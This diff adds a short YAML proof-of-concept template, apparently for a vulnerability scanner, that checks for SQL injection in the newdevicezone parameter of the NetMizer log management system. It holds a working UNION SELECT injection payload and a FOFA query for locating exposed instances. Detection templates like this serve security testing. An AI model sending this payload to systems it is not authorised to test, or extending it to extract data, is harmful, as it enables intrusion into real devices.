@@ -1,0 +1,17 @@
+id: poc-yaml-netmizer-log-ms-newdevicezone-sqli
+info:
+  name: NetMizer 日志管理系统 newdevicezone SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: NetMizer 日志管理系统
+  fofa: app="NetMizer-日志管理系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /data/echart/terminals.php?action=phonelist-grid&newdevicezone=ip:0%20-111+UNION+ALL+SELECT+null,CONCAT(0x7e,(select/**/md5({{.t1}})),0x7e),null,null,null,null,null--
+  expression: status_code == 200 && contains(body,"\"success\":true") && contains(body,"datas")
+    && !contains(body,"<") && contains(body,t2)
+transport: http
